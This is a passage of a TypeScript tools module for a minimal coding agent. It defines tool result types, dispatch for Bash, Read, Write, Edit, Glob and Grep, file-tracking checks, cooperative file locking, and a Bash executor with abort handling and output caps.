/**
 * Tools module: tool definitions and execution for the minimal agent.
 *
 * Each tool has a JSON-schema definition (sent to the API) and a local
 * executor function. The agent's tool loop calls {@link executeTool} when the
 * model emits a `tool_use` block, then sends the result back as a
 * `tool_result`.
 *
 * **Tools provided (core):**
 * - {@link BASH_TOOL | Bash}: execute shell commands (cwd persists across calls)
 * - {@link READ_TOOL | Read}: read file contents with cat -n style line numbers
 * - {@link WRITE_TOOL | Write}: write/create files (creates parent dirs)
 * - {@link EDIT_TOOL | Edit}: exact string replacement in files
 * - {@link GLOB_TOOL | Glob}: find files by glob pattern (uses bash globstar)
 * - {@link GREP_TOOL | Grep}: search file contents using ripgrep
 * - {@link FILES_STATS_TOOL | FilesStats}: report tracked-file status
 * - {@link MODE_TOOL | Mode}: report the active operating mode
 *
 * The extended surface (sub-agents, skills, background jobs, browser control,
 * memory, scheduling, …) ships as runtime-loaded plugins, not here.
 *
 * @module tools
 */

import { existsSync, mkdirSync, readFileSync, statSync } from "node:fs"
import { dirname, resolve } from "node:path"

import { configPath as userConfigPath } from "../config/config.ts"
import { acquireLock, LockAbortedError, LockTimeoutError } from "../infra/file-lock.ts"
import type { ImageBlock } from "../llm/canonical-messages.ts"
import { decideReadFile, type ReadFileMediaContext } from "../media/read-file.ts"
import {
  type FileTrackingStore,
  normalizeTrackedPath,
  statMetadata,
} from "../session/file-tracking-store.ts"
import { getSessionId } from "../session/session-id.ts"
import { buildEditDiff, buildFileDiff, renderUnifiedDiff } from "../utils/diff.ts"
import { parseJsonc } from "../utils/jsonc.ts"

import { buildFilesStatsReport, formatFilesStatsReport } from "./files-stats.ts"
import { resolveGlobExecArgs } from "./glob-input.ts"
import * as ToolPrompts from "./PROMPTS.ts"
import { resolveWhitespaceConfusablePath } from "./path-heal.ts"
import { TOOL_DEFINITIONS } from "./tool-definitions.ts"
import {
  clampToolRaw,
  type TruncateCtx,
  type TruncationInfo,
  truncateToolOutput,
} from "./truncation.ts"

export { TOOL_DEFINITIONS }

const MAX_READ_BYTES = 50 * 1024 * 1024 // 50 MiB: blocks runaway whole-file reads (B-045)

/**
 * Hard ceiling on the COMBINED stdout+stderr a single Bash command may buffer
 * in memory, enforced DURING the streaming drain (B-005). Without it `drain()`
 * does `acc += s` with no bound, so a high-volume command (`cat /dev/zero`,
 * `yes`, a chatty build) grows the accumulator until the process OOMs — long
 * before the post-hoc 64 KB clamp in {@link executeTool} ever runs.
 *
 * 512 KiB is intentionally tight: ~8× the model-facing 64 KB clamp, enough
 * head for a useful blob-store recovery slice, but not enough to materialize
 * a minified webpack bundle (Adrian 2026-08-05: 7.2 MB single-line `rg` hit).
 * On crossing it we terminate the child group and return the capped output.
 */
export const MAX_BASH_OUTPUT_BYTES = 512 * 1024

/**
 * A non-text block a tool may attach to its `tool_result`. Today only canonical
 * {@link ImageBlock} (an inline-base64 image) : Anthropic tool results carry
 * text + image content, not documents. Provider-neutral by construction; the
 * agent converts it to the wire shape when assembling the `tool_result`.
 */
export type ToolResultMediaBlock = ImageBlock

/**
 * Per-call media capability context. Threaded into {@link executeTool} so a
 * media-aware tool (currently `Read`) can decide, for the ACTIVE model, whether
 * a file is an image worth embedding, must be shrunk first, or can't be shown.
 * Provider-neutral: the host fills it from the resolved model's capabilities +
 * the active provider's media limits. Absent → tools behave text-only (the
 * pre-multimodal behavior), so this is a safe additive option.
 */
export type ToolMediaContext = ReadFileMediaContext

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

/**
 * A tool definition sent in the `tools` array of a Messages API request.
 *
 * The Anthropic API uses this exact shape (see SDK type `Anthropic.Tool`).
 * The `input_schema` field is a JSON Schema that the model uses to construct
 * valid tool inputs.
 *
 * @example
 * ```ts
 * const myTool: ToolDefinition = {
 *   name: "Calculator",
 *   description: "Performs basic arithmetic",
 *   input_schema: {
 *     type: "object",
 *     properties: { expression: { type: "string" } },
 *     required: ["expression"],
 *   },
 * };
 * ```
 */
/**
 * Color name for tool label rendering. Keys into the agent's ANSI color
 * palette (`c` in `agent.ts`). Kept as a string union so tool authors get
 * autocomplete without importing the palette.
 */
export type ToolColor =
  | "orange"
  | "pink"
  | "purple"
  | "lime"
  | "sky"
  | "violet"
  | "gold"
  | "cyan"
  | "green"
  | "red"
  | "yellow"
  | "magenta"
  | "brightCyan"
  | "brightGreen"
  | "brightYellow"
  | "brightRed"
  | "brightMagenta"

export interface ToolDefinition {
  /** Unique tool name. Must match the `name` in `tool_use` blocks. */
  name: string
  /** Plain-text description shown to the model : explains when/how to use it. */
  description: string
  /** JSON Schema describing the tool's input parameters. */
  input_schema: Record<string, unknown>
  /**
   * Optional single-glyph icon shown next to the tool name in transcript
   * headers. Purely cosmetic : never sent to the API. Pick something narrow
   * (1 cell) so the header stays aligned.
   */
  icon?: string
  /**
   * Optional palette color for the tool's label in transcript headers.
   * Purely cosmetic : never sent to the API.
   */
  color?: ToolColor
  /**
   * Optional name of the input field to surface in the transcript header
   * (e.g. `"url"` for Fetch). Read synchronously by `formatToolInput` so a
   * plugin tool shows a clean identifying header the instant the call
   * starts. Purely cosmetic : never sent to the API. Only set for
   * plugin-contributed tools (built-ins format their own headers).
   */
  headerKey?: string
}

/**
 * Result of executing a tool locally. Sent back to the API as the `content`
 * of a `tool_result` block.
 *
 * @example
 * ```ts
 * // Success:
 * { content: "file contents here..." }
 *
 * // Error:
 * { content: "Read error: ENOENT", is_error: true }
 * ```
 */
export interface ToolExecResult {
  /** Tool output as a string (multi-line allowed). */
  content: string
  /**
   * Optional non-text content blocks (currently images) to attach to the
   * `tool_result` ALONGSIDE `content`. Set by media-aware tools like `Read`
   * when a file is an image the active model accepts: the bytes ride as a
   * real {@link ToolResultContentBlock} so a vision model actually sees the
   * pixels instead of UTF-8 mojibake. `content` stays the model-facing text
   * caption (a one-line summary), so a non-multimodal transport still has
   * something coherent. Absent for the overwhelming majority of tool calls.
   *
   * The universal output clamp in {@link executeTool} never touches these
   * blocks (they are already byte-bounded by the media limits / fit-to-budget
   * step that produced them). The blob-store hook also skips them.
   * @see src/media/read-file.ts
   */
  blocks?: ToolResultMediaBlock[]
  /** True if the tool failed; the model uses this to decide whether to retry. */
  is_error?: boolean
  /**
   * Optional pre-rendered ANSI string to display in the transcript instead of
   * `content`. Used by Edit/Write to show colored unified diffs while keeping
   * the model's `tool_result` text compact.
   */
  display?: string
  /**
   * Optional plain unified diff used as the source for presentation-only syntax
   * composition. Kept separate from `display` so the renderer can fall back to
   * the existing colored diff when no highlighter is available.
   * @internal
   */
  _displayPatch?: string
  /** Whether the Write diff treated an absent/empty prior file as new. @internal */
  _displayNewFile?: boolean
  /**
   * Internal: truncation context passed from each tool's executor up to
   * {@link executeTool}'s universal clamp. Stripped before the result is
   * returned so callers never see it. Not part of the public API.
   * @internal
   */
  _truncCtx?: TruncateCtx
  /**
   * Internal: structured "what got cut" data, populated by `executeTool`
   * after the universal clamp runs. Read by the agent's transcript renderer
   * (`formatToolPreview`) to draw a bare-facts footer (`shown N/M L · X/Y B`)
   * without parsing the trailing `[truncated: ...]` notice that lives inside
   * `content` for the model. Stripped before the result is sent back to the
   * API as a `tool_result` block. Not part of the public API.
   * @internal
   */
  _truncInfo?: TruncationInfo
  /**
   * Internal: set when a tool was cancelled mid-flight via an
   * {@link AbortSignal}. The agent's transcript renderer consumes this to
   * draw a dim "canceled" footer; the field is stripped before the result
   * is sent back to the API as a `tool_result`.
   * @internal
   */
  _aborted?: boolean
  /**
   * Internal: pre-clamp body, populated by {@link executeTool} ONLY when
   * the universal truncation clamp actually fired
   * (`info.truncated === true`). The agent uses this as the source for the per-session blob
   * store (see `src/blob-store.ts`) so the FULL output survives even
   * though the model only sees the clamped `content`. Absent when the
   * body fit under both budgets (no information to preserve). Stripped
   * before serialization by {@link stripInternalFields}.
   * @internal
   */
  _raw?: string
}

/**
 * Per-call options for {@link executeTool}.
 *
 * `signal` lets the host cancel a long-running tool (e.g. a `Bash` call
 * doing `sleep 60`) without freezing the event loop. When the signal
 * fires the tool resolves with
 * `{ is_error: true, content: "tool aborted by user", _aborted: true }`.
 */
export interface ToolExecOpts {
  signal?: AbortSignal
  /**
   * Active-model media capability context. When present, media-aware tools
   * (`Read`) may return image content blocks for files the model accepts.
   * When absent, those tools fall back to text-only behavior. See
   * {@link ToolMediaContext}.
   */
  media?: ToolMediaContext
  /**
   * Optional stdout-chunk callback. Currently only honored by `Bash` : chunks
   * are decoded UTF-8 strings forwarded as the child writes them, so the
   * caller can render output live instead of waiting for the process to
   * exit. The chunks ARE NOT pre-buffered into lines; the caller is
   * responsible for line-buffering if it wants line-grained rendering.
   */
  onStdout?: (chunk: string) => void
  /** Stderr counterpart to {@link onStdout}. Bash-only for now. */
  onStderr?: (chunk: string) => void
  /** Optional durable tracker for tool file observations. */
  fileTrackingStore?: FileTrackingStore
}

/**
 * Strip internal-only fields (`_truncCtx`, `_truncInfo`, `_aborted`,
 * `_raw`) from a result before sending it back to the API.
 *
 * {@link executeTool} already strips `_truncCtx` (input-only).
 * `_truncInfo`, `_aborted`, and `_raw` are preserved through
 * `executeTool` so the renderer / agent's blob-store hook can see them,
 * and stripped here right before serialization.
 */
export function stripInternalFields(r: ToolExecResult): void {
  delete r._displayPatch
  delete r._displayNewFile
  delete r._truncCtx
  delete r._truncInfo
  delete r._aborted
  delete r._raw
}

const ABORTED_RESULT = (): ToolExecResult => ({
  content: ToolPrompts.toolAbortedByUserResult(),
  is_error: true,
  _aborted: true,
})

// ---------------------------------------------------------------------------
// Tool execution
// ---------------------------------------------------------------------------

/**
 * Working directory for Bash, persists across calls within a single agent
 * process. Mirrors the real CLI's behavior where `cd` in one Bash call
 * affects subsequent calls (but shell state like env vars and aliases does not).
 */
let bashCwd = process.cwd()

/** Optional observer for sticky Bash cwd changes (`cwd.didChange`). */
let cwdChangeListener: ((from: string, to: string) => void) | null = null

/**
 * Register (or clear with `null`) a listener fired when bare `cd` updates
 * the sticky Bash cwd. Hosts wire this to LifecyclePort.cwdDidChange /
 * `cwd.didChange`.
 */
export function setBashCwdChangeListener(
  listener: ((from: string, to: string) => void) | null,
): void {
  cwdChangeListener = listener
}

/**
 * Execute a tool by name with the given input.
 *
 * Dispatches to the appropriate exec function. Unknown tool names return an
 * error result rather than throwing : the model can recover by picking a
 * different tool.
 *
 * @param name - Tool name as it appears in {@link ToolDefinition.name}
 * @param input - Parsed JSON input matching the tool's `input_schema`
 * @returns Tool result with `content` and optional `is_error` flag
 *
 * @example
 * ```ts
 * const result = executeTool("Bash", { command: "echo hello" });
 * console.log(result.content); // "hello"
 * ```
 */
export async function executeTool(
  name: string,
  input: Record<string, unknown>,
  opts: ToolExecOpts = {},
): Promise<ToolExecResult> {
  // Already-aborted shortcut: don't even dispatch. The Write-with-aborted
  // test asserts no IO happens in this case.
  if (opts.signal?.aborted) return ABORTED_RESULT()

  const r = await dispatch(name, input, opts)
  // Universal post-hoc clamp. Skip when `display` is set : diffs are bounded
  // by Edit/Write inputs and we want them rendered intact in the transcript.
  // Aborted results are clamped too: the canned "tool aborted by user"
  // string is trivially under cap, and aborted Bash with partial stdout
  // (e.g. a runaway `yes` for 5s before ESC) genuinely needs the clamp.
  if (!r.display) {
    const ctx: TruncateCtx = { tool: name, ...(r._truncCtx ?? {}) }
    const preClamp = r.content
    const { content, info } = truncateToolOutput(preClamp, ctx)
    r.content = content
    // Hand the renderer structured "what got cut" data, separate from the
    // model-facing `[truncated: ...]` notice that lives inside `content`.
    // The TUI footer (`shown N/M L · X/Y B`) reads from this; the model
    // reads the verbose notice. Audiences split. See `formatToolPreview`
    // in `src/agent.ts`.
    r._truncInfo = info
    // Surface the pre-clamp body to the agent's blob-store hook ONLY
    // when the clamp actually fired. When `info.truncated === false`,
    // `content` already equals the full body and there's nothing
    // additional to preserve. Cap the persisted slice so a pathological
    // tool body (Read of a huge file, Bash mega-line before drain kill)
    // cannot write multi-MB blobs. See `src/blob-store.ts` /
    // `MAX_TOOL_RAW_BYTES`.
    if (info.truncated) r._raw = clampToolRaw(preClamp)
  }
  // `_truncCtx` was an executor→clamp ferry; once consumed, drop it. We
  // intentionally KEEP `_truncInfo`, `_aborted`, and `_raw` so the
  // renderer / blob-store hook can see them; all three are stripped by
  // `stripInternalFields` before serialization.
  delete r._truncCtx
  return r
}

async function dispatch(
  name: string,
  input: Record<string, unknown>,
  opts: ToolExecOpts,
): Promise<ToolExecResult> {
  switch (name) {
    case "Bash":
      return execBash(input, opts)
    case "Read": {
      const result = await execRead(input, opts)
      if (opts.fileTrackingStore && typeof input.file_path === "string") {
        // Record the observation on success AND on a genuinely-missing file
        // (the read-observed-missing observation is what authorizes a later
        // `Write` to CREATE the path). Other read failures (EACCES, IO) leave
        // any prior observation untouched so a stale "present" record can't be
        // downgraded to "missing" by an unreadable stat.
        if (!result.is_error || !existsSync(input.file_path)) {
          opts.fileTrackingStore.track(input.file_path)
        }
      }
      return result
    }
    case "Write":
      return withFileLock("Write", input, opts, async () => {
        const precondition = checkTrackedFilePrecondition(
          opts.fileTrackingStore,
          input.file_path,
          "Write",
        )
        if (precondition) return precondition
        const result = await execWrite(input, opts)
        recordTrackedFileObservation(opts.fileTrackingStore, input.file_path, result)
        return result
      })
    case "Edit":
      return withFileLock("Edit", input, opts, async () => {
        const precondition = checkTrackedFilePrecondition(
          opts.fileTrackingStore,
          input.file_path,
          "Edit",
        )
        if (precondition) return precondition
        const result = await execEdit(input, opts)
        recordTrackedFileObservation(opts.fileTrackingStore, input.file_path, result)
        return result
      })
    case "Glob":
      return execGlob(input, opts)
    case "Grep":
      return execGrep(input, opts)
    case "FilesStats":
      if (!opts.fileTrackingStore) {
        return {
          content:
            "FilesStats: file tracking is not enabled in this host. Read/Edit/Write observations and this report are unavailable here.",
          is_error: true,
        }
      }
      return {
        content: formatFilesStatsReport(
          buildFilesStatsReport(opts.fileTrackingStore, {
            status: input.status as "all" | "present" | "missing" | "changed" | undefined,
            path: typeof input.path === "string" ? input.path : undefined,
          }),
        ),
      }
    case "Mode":
      // `Mode` is intercepted by the agent loop BEFORE `executeTool` is
      // called : the synthesizer there has access to the live
      // ModeManager, which `tools.ts` does not. If a path ever bypasses
      // the interceptor and reaches here, surface a clear error rather
      // than silently returning stale data.
      return {
        content: ToolPrompts.modeToolDispatcherBugResult(),
        is_error: true,
      }
    case "reflection-ack":
      // Model confused the inline XML tag for a tool call (common with
      // flash/small models that interpret "emit" as "call a tool").
      // Return a neutral success: the agent loop reads the tool input
      // and applies the silence there. The content doubles as a
      // corrective hint so the model learns to write the tag as text
      // next time.
      return {
        content: ToolPrompts.reflectionAckToolResult(),
        is_error: false,
      }
    default:
      return { content: ToolPrompts.unknownToolResult(name), is_error: true }
  }
}

// ---------------------------------------------------------------------------
// File tracking integration
// ---------------------------------------------------------------------------

function checkTrackedFilePrecondition(
  store: FileTrackingStore | undefined,
  filePath: unknown,
  tool: "Edit" | "Write",
): ToolExecResult | null {
  // No tracker wired → previous no-tracking behavior (unit tests, hosts that
  // opt out). When a tracker IS present the precondition is enforced.
  if (!store || typeof filePath !== "string" || filePath.length === 0) return null

  // A Write to a path with nothing on disk is a CREATE — there is no file to
  // overwrite, so no prior Read is required. This keeps the natural
  // "write a brand-new file" flow working without a clunky read-ENOENT
  // dance first (the tracker still records the observation on success).
  const path = normalizeTrackedPath(filePath, store.cwd)
  if (tool === "Write" && statMetadata(path) === null) return null

  const tracked = store.lookup(filePath)
  if (!tracked) {
    return {
      content: `${tool} error: ${filePath} has not been read in this session. Read it first, then retry the ${tool.toLowerCase()}.`,
      is_error: true,
    }
  }
  const status = store.status(filePath)
  if (status === "present") return null
  const reason =
    status === "missing"
      ? "file no longer exists (it was present when last read)"
      : "file changed since it was last read"
  return {
    content: `${tool} error: ${reason}: ${filePath}. Read it again, then retry the ${tool.toLowerCase()}.`,
    is_error: true,
  }
}

function recordTrackedFileObservation(
  store: FileTrackingStore | undefined,
  filePath: unknown,
  result: ToolExecResult,
): void {
  if (store && !result.is_error && typeof filePath === "string" && filePath.length > 0) {
    store.track(filePath)
  }
}

// ---------------------------------------------------------------------------
// File locking (cooperative, for concurrent agents in a shared worktree)
// ---------------------------------------------------------------------------

/**
 * Resolved file-lock configuration. Sourced from
 * `~/.minimal-agent/config.jsonc` under `plugins["file-lock"]` (single
 * source of truth : the same key the loader reads to decide whether to
 * activate the companion plugin), with sane defaults when missing.
 *
 * Read once and cached: tools.ts is hot-path on every Edit/Write, and the
 * config doesn't change mid-session.
 */
interface FileLockConfig {
  enabled: boolean
  tools: ReadonlySet<string>
  timeoutMs: number
  staleAfterMs: number
}

let _fileLockConfig: FileLockConfig | null = null

function fileLockConfig(): FileLockConfig {
  if (_fileLockConfig !== null) return _fileLockConfig
  // Hard env opt-out for tests / debugging. Doesn't pollute the config file.
  if (process.env.MINIMAL_AGENT_FILE_LOCK_DISABLED === "1") {
    _fileLockConfig = {
      enabled: false,
      tools: new Set(["Edit", "Write"]),
      timeoutMs: 30_000,
      staleAfterMs: 300_000,
    }
    return _fileLockConfig
  }
  const defaults: FileLockConfig = {
    enabled: true,
    tools: new Set(["Edit", "Write"]),
    timeoutMs: 30_000,
    staleAfterMs: 300_000,
  }
  // Read raw JSONC directly. `loadUserConfig()` validates and returns
  // only its whitelisted keys (model, effort, etc.) : `plugins.<id>` is
  // not in that whitelist, so we must read the raw file ourselves. This
  // matches the pattern in `loadDisabledPluginIds` (src/config.ts).
  try {
    const path = userConfigPath()
    if (!existsSync(path)) {
      _fileLockConfig = defaults
      return _fileLockConfig
    }
    const raw = readFileSync(path, "utf-8")
    const parsed = parseJsonc(raw) as unknown
    if (!parsed || typeof parsed !== "object" || Array.isArray(parsed)) {
      _fileLockConfig = defaults
      return _fileLockConfig
    }
    const plugins = (parsed as Record<string, unknown>).plugins as
      | Record<string, unknown>
      | undefined
    const block = plugins?.["file-lock"] as Record<string, unknown> | undefined
    if (!block) {
      _fileLockConfig = defaults
      return _fileLockConfig
    }
    const enabled = block.enabled === false ? false : defaults.enabled
    const tools =
      Array.isArray(block.tools) && block.tools.every((t) => typeof t === "string")
        ? new Set(block.tools as string[])
        : defaults.tools
    const timeoutMs =
      typeof block.timeoutMs === "number" && block.timeoutMs > 0
        ? block.timeoutMs
        : defaults.timeoutMs
    const staleAfterMs =
      typeof block.staleAfterMs === "number" && block.staleAfterMs > 0
        ? block.staleAfterMs
        : defaults.staleAfterMs
    _fileLockConfig = { enabled, tools, timeoutMs, staleAfterMs }
    return _fileLockConfig
  } catch {
    _fileLockConfig = defaults
    return _fileLockConfig
  }
}

/** Test seam: drop the cached config so the next call re-reads the file/env. */
export function _resetFileLockConfigForTests(): void {
  _fileLockConfig = null
}

/**
 * Wrap a mutation tool's execution in a cooperative file lock.
 *
 * The lock spans only the body of `run()` : held for as long as the
 * read-modify-write takes, typically under 100ms. On lock failure, returns a
 * `tool_result` with `is_error: true` and a holder-rich diagnostic so the
 * model can decide to wait, inspect via `LockStatus`, or proceed elsewhere.
 *
 * Disabled gracefully when `plugins["file-lock"].enabled === false` or
 * `MINIMAL_AGENT_FILE_LOCK_DISABLED=1` is set in the environment : `run()`
 * is invoked directly with no lock.
 */
async function withFileLock(
  tool: string,
  input: Record<string, unknown>,
  opts: ToolExecOpts,
  run: () => Promise<ToolExecResult>,
): Promise<ToolExecResult> {
  const cfg = fileLockConfig()
  if (!cfg.enabled || !cfg.tools.has(tool)) return run()
  const filePath = input.file_path
  if (typeof filePath !== "string" || filePath.length === 0) {
    // Let the executor return its own validation error : we've nothing to lock.
    return run()
  }
  try {
    using _handle = await acquireLock(
      filePath,
      { sessionId: getSessionId(), tool },
      {
        timeoutMs: cfg.timeoutMs,
        staleAfterMs: cfg.staleAfterMs,
        signal: opts.signal,
      },
    )
    return await run()
  } catch (e) {
    if (e instanceof LockTimeoutError) {
      return { content: ToolPrompts.lockTimeoutResult(tool, e.message), is_error: true }
    }
    if (e instanceof LockAbortedError) {
      return ABORTED_RESULT()
    }
    // Any other thrown error from acquire (filesystem-level) : surface as
    // a tool error rather than letting it crash the dispatch loop.
    const msg = e instanceof Error ? e.message : String(e)
    return { content: ToolPrompts.lockAcquireFailedResult(tool, msg), is_error: true }
  }
}

/**
 * Execute a Bash command via `bash -c`.
 *
 * Special handling for `cd` commands: rather than forking a shell that
 * immediately exits (losing the cwd change), we parse `cd <path>` ourselves
 * and update the persistent {@link bashCwd}.
 *
 * Stdout and stderr are concatenated into the result content. Non-zero exit
 * codes are reported as errors.
 *
 * @param input - Tool input:
 *   - `command` - Shell command to execute
 *   - `timeout` - Optional timeout in ms (default: 120000)
 */
async function execBash(
  input: Record<string, unknown>,
  opts: ToolExecOpts,
): Promise<ToolExecResult> {
  const command = input.command as string
  const timeout = (input.timeout as number) ?? 120_000

  try {
    // Persistent-cwd shortcut for *bare* `cd <path>`.
    //
    // Each `bash -c` invocation runs in a fresh subshell, so a plain `cd`
    // through bash would be lost the moment the subshell exits. To keep
    // `bashCwd` sticky across tool calls we intercept the bare form here
    // and update it directly.
    //
    // CRITICAL: only intercept when there are NO shell operators in the
    // tail. The naive `^cd\s+(.+)$` capture is greedy and swallows
    // pipelines like `cd /foo && bun test` or `cd /foo | tee log` as if
    // the entire tail were a path : bash never runs, the operator is
    // lost, and we synthesize a misleading "no such directory" error
    // containing the full pipeline. Anything containing `&&`, `||`, `;`,
    // `|`, `&`, redirections (`<`, `>`), backticks, or `$(...)` is
    // delegated to `bash -c` so the operators take effect (the cd then
    // happens inside the subshell and does NOT mutate `bashCwd`, matching
    // POSIX semantics for chained commands).
    //
    // Regression test: src/tools-bash-cd.test.ts.
    const cdMatch = command.match(/^cd\s+(.+?)\s*$/)
    if (cdMatch && !/[;&|<>`$()]/.test(cdMatch[1])) {
      const raw = cdMatch[1].trim()
      // Strip a single matched pair of surrounding quotes.
      const unquoted =
        (raw.startsWith('"') && raw.endsWith('"')) || (raw.startsWith("'") && raw.endsWith("'"))
          ? raw.slice(1, -1)
          : raw
      const newDir = resolve(bashCwd, unquoted)
      if (existsSync(newDir)) {
        const from = bashCwd
        bashCwd = newDir
        if (from !== newDir) {
          try {
            cwdChangeListener?.(from, newDir)
          } catch {
            /* observer must not break Bash */
          }
        }
        return { content: "" }
      }
      return { content: ToolPrompts.cdNoSuchDirectoryResult(unquoted), is_error: true }
    }

    // Async spawn: critical for UI responsiveness. The previous
    // `spawnSync` blocked the entire event loop for the duration of the
    // child process : the spinner stopped animating, keystrokes weren't
    // echoed, and Ctrl+C couldn't be handled. With `Bun.spawn` the agent
    // can keep painting the status bar and (eventually) honor a user-key
    // abort routed through `opts.signal`.
    //
    // We inject `COLUMNS`/`LINES` from the host's view of the controlling
    // terminal so tools inside Bash (`tput cols`, `stty size` fallback,
    // shell scripts that consult `$COLUMNS`) see real values instead of
    // tput's hardcoded 80x24 last-resort fallback. Snapshot-at-spawn, not
    // live : if the user resizes mid-command, `$COLUMNS` inside that bash
    // does NOT update. Acceptable because bash commands are short-lived;
    // mirrors the stance documented in `src/ui/formatter/formatter.ts:formatterEnv`.
    // `TERM=dumb` is kept : it prevents subprocess tools from emitting
    // ANSI escapes that would corrupt our tool-output rendering. Size
    // belongs to env vars; capabilities belong to TERM.
    const env: Record<string, string> = { ...process.env, TERM: "dumb" }
    if (typeof process.stdout.columns === "number" && process.stdout.columns > 0) {
      env.COLUMNS = String(Math.floor(process.stdout.columns))
    }
    if (typeof process.stdout.rows === "number" && process.stdout.rows > 0) {
      env.LINES = String(Math.floor(process.stdout.rows))
    }
    const proc = Bun.spawn(["bash", "-c", command], {
      cwd: bashCwd,
      env,
      stdout: "pipe",
      stderr: "pipe",
      stdin: "ignore",
      // Make bash the leader of its own process group so we can group-kill
      // children when the user aborts. Without this, `proc.kill(SIGTERM)`
      // only kills bash; an orphan child (e.g. `sleep 30` inside `sleep 30
      // && echo never`) inherits stdout/stderr pipes and keeps them open,
      // blocking the `drain()` readers below indefinitely : the agent's
      // tool loop then hangs even though the abort signal fired and the
      // SIGTERM was delivered to bash. See tmp/abort-bash-children-repro.ts.
      detached: true,
    })

    let aborted = false
    let timedOut = false
    // Shared across both drains (stdout + stderr) so the ceiling is on COMBINED
    // output, not per-stream. JS is single-threaded; the interleaved awaits in
    // the two drain() calls mutate these safely (B-005).
    let outputBytes = 0
    let outputCapped = false
    const killTree = (sig: "SIGTERM" | "SIGKILL") => {
      // Group-kill so any descendants bash spawned die too. Negative pid
      // = process group; only works because we passed `detached: true`
      // above to make bash its own pgrp leader. Falls back to a single-pid
      // kill if the group lookup fails (rare; e.g. bash already exited
      // and the pgrp was reaped).
      try {
        process.kill(-proc.pid, sig)
      } catch {
        try {
          proc.kill(sig)
        } catch {
          /* already exited */
        }
      }
    }
    const escalateKill = () => {
      killTree("SIGTERM")
      // Grace period before SIGKILL : matches the abort-quit-rewind plan.
      setTimeout(() => {
        if (proc.exitCode == null && proc.signalCode == null) killTree("SIGKILL")
      }, 2000).unref?.()
    }

    const timer =
      timeout > 0
        ? setTimeout(() => {
            timedOut = true
            escalateKill()
          }, timeout)
        : null

    const signal = opts.signal

    // Manual streaming drain. Replaces `new Response(stream).text()` (which
    // only resolves on pipe-close) with a reader loop that decodes UTF-8
    // incrementally and forwards each chunk to the caller's optional
    // `onStdout`/`onStderr` callback as bash writes it. The full text is
    // also accumulated for the returned `content` so the model sees the
    // same payload it would have without streaming. Critical for UI
    // responsiveness on long-running commands : without this the agent
    // can't render anything until the entire 20s loop (or whatever) exits.
    //
    // The reader is also cancelled when `signal` aborts. The group-kill
    // above is the primary mechanism for terminating descendants and
    // closing pipes; this reader-cancel is the belt-and-suspenders for
    // the corner case where a double-forked daemon detaches from the
    // group and keeps the write-end open. Without it, drain would block
    // forever and the agent's tool loop would never resume.
    const drain = async (
      stream: ReadableStream<Uint8Array>,
      cb?: (s: string) => void,
    ): Promise<string> => {
      const decoder = new TextDecoder()
      let acc = ""
      const reader = stream.getReader()
      const cancelReader = () => {
        reader.cancel().catch(() => {
          /* already cancelled or stream closed */
        })
      }
      if (signal) {
        if (signal.aborted) cancelReader()
        else signal.addEventListener("abort", cancelReader, { once: true })
      }
      try {
        while (true) {
          const { done, value } = await reader.read()
          if (done) break
          // Once the combined ceiling is hit, keep reading (so the pipe drains
          // and closes) but DISCARD: never grow `acc` further. Bounds memory at
          // ~cap + one chunk even if the killed child is slow to release the
          // write end (B-005).
          if (outputCapped) continue
          // Count RAW bytes of the chunk against the shared budget before
          // decoding. This is the true memory pressure; enforcing it here (not
          // post-hoc) is the whole point — `acc += s` on `cat /dev/zero` would
          // OOM long before executeTool's 64 KB clamp ever ran.
          outputBytes += value.byteLength
          const s = decoder.decode(value, { stream: true })
          if (s) {
            acc += s
            cb?.(s)
          }
          if (outputBytes > MAX_BASH_OUTPUT_BYTES) {
            outputCapped = true
            // Terminate the child group so it stops producing and both pipes
            // close (ending both drains). Same escalation as timeout/abort.
            escalateKill()
          }
        }
      } finally {
        if (signal) signal.removeEventListener("abort", cancelReader)
        reader.releaseLock()
      }
      // Skip the flush tail once capped — we're intentionally not accumulating.
      const tail = outputCapped ? "" : decoder.decode()
      if (tail) {
        acc += tail
        cb?.(tail)
      }
      return acc
    }

    const onAbort = () => {
      aborted = true
      escalateKill()
    }
    if (signal) {
      if (signal.aborted) onAbort()
      else signal.addEventListener("abort", onAbort, { once: true })
    }

    let stdout = ""
    let stderr = ""
    try {
      ;[stdout, stderr] = await Promise.all([
        drain(proc.stdout, opts.onStdout),
        drain(proc.stderr, opts.onStderr),
      ])
      await proc.exited
    } finally {
      if (timer) clearTimeout(timer)
      if (signal) signal.removeEventListener("abort", onAbort)
    }

    const output = [stdout, stderr].filter(Boolean).join("\n").trim()

    if (aborted) {
      // Surface partial output captured before SIGTERM landed instead of
      // discarding it. The drain readers resolve on pipe-close, which
      // happens when bash exits : so by the time we get here `stdout`/
      // `stderr` already hold whatever the child managed to flush.
      // Returning empty would tell the user "nothing happened", when in
      // reality 4-5s of work may have produced useful logs.
      if (!output) return ABORTED_RESULT()
      // Push the marker through the stdout stream too so any live
      // line-streamer in the host sees it as the trailing line. The
      // marker is also baked into `content` for the model.
      opts.onStdout?.("\n[aborted by user]\n")
      const trailed = `${output}\n[aborted by user]`
      const totalBytes = Buffer.byteLength(trailed, "utf8")
      const totalLines = trailed.split("\n").length
      return {
        content: trailed,
        is_error: true,
        _aborted: true,
        _truncCtx: { totalBytes, totalLines },
      }
    }
    // Output ceiling hit (B-005): the child was killed mid-stream because its
    // combined stdout+stderr crossed MAX_BASH_OUTPUT_BYTES. Surface what we
    // captured (bounded at ~cap) plus an explicit marker. Checked before the
    // timeout/exit-code branches because the kill we issued can also flip those
    // and the cap is the more precise explanation. The universal post-hoc clamp
    // still trims this to 64 KB for the model; the full capped body reaches the
    // blob store via `_raw`.
    if (outputCapped) {
      const capMsg = ToolPrompts.bashOutputCapMarker(MAX_BASH_OUTPUT_BYTES)
      // PREPEND the marker: the body is ~MAX_BASH_OUTPUT_BYTES, far past the
      // universal 64 KB post-hoc clamp which keeps the FRONT. An end-appended
      // marker would be clipped off; at the front the model always sees it.
      const trailed = output ? `${capMsg}\n${output}` : capMsg
      return {
        content: trailed,
        is_error: true,
        _truncCtx: {
          totalBytes: Buffer.byteLength(trailed, "utf8"),
          totalLines: trailed.length === 0 ? 0 : trailed.split("\n").length,
        },
      }
    }

    const totalBytes = Buffer.byteLength(output, "utf8")
    const totalLines = output.length === 0 ? 0 : output.split("\n").length

    if (timedOut) {
      return {
        content: output
          ? `${output}\n${ToolPrompts.bashTimedOutMarker(timeout)}`
          : ToolPrompts.bashTimedOutMarker(timeout),
        is_error: true,
        _truncCtx: { totalBytes, totalLines },
      }
    }

    if (proc.exitCode !== 0) {
